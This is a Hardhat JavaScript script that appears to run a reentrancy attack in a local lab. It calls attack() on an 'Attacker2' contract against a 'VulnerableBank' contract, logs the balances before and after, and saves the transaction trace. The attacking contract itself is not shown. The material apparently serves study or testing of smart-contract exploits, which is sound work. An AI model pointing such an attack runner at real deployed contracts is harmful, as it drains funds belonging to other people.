  const {ethers} = require("hardhat");
  const {saveTrace} = require("../../utils/saveTrace.js");
  const {loadContext} = require ("../../utils/context.js");
  async function main () {
    const ctx = await loadContext();
     /* console.log("attacker Contract balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)), "ETH");;
      console.log("reentrancyTest Contract balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)), "ETH");;
      console.log("attacker account balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.signer)), "ETH");
*/
  const tx1 = await ctx.contractAttacker2.setMaxAttacks(3); // whichever value you're testing
  const receipt1 = await tx1.wait();
  console.log("setMaxAttacks tx hash:", receipt1.hash);
  console.log("New MAX_ATTACKS value:", await ctx.contractAttacker2.MAX_ATTACKS());


 console.log("vulnerable bank balance before deposit = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.VulnerableBankAddress)), "ETH");
 console.log("attacker 2 Contract balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.Attacker2Address)), "ETH");;

    const amount = ethers.parseEther("1.3");
    const calldata = ctx.contractAttacker2.interface.encodeFunctionData("attack");
    const tx = await ctx.signer.sendTransaction({
          to : ctx.Attacker2Address,
          data: calldata,
          value: ethers.parseEther("0.002")    
      })
    const receipt = await tx.wait();
    console.log(tx.hash);

 console.log("vulnerable bank balance after deposit = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.VulnerableBankAddress)), "ETH");
  console.log("attacker 2 Contract balance AFTER executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.Attacker2Address)), "ETH");;
/*
      console.log("attacker Contract balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)), "ETH");;
      console.log("reentrancyTest Contract balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)), "ETH");;
      console.log("attacker account balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.signer)), "ETH");
*/
  await saveTrace(tx.hash, "./test_traces", "attack_three");
  
  }
  main().catch(console.error);
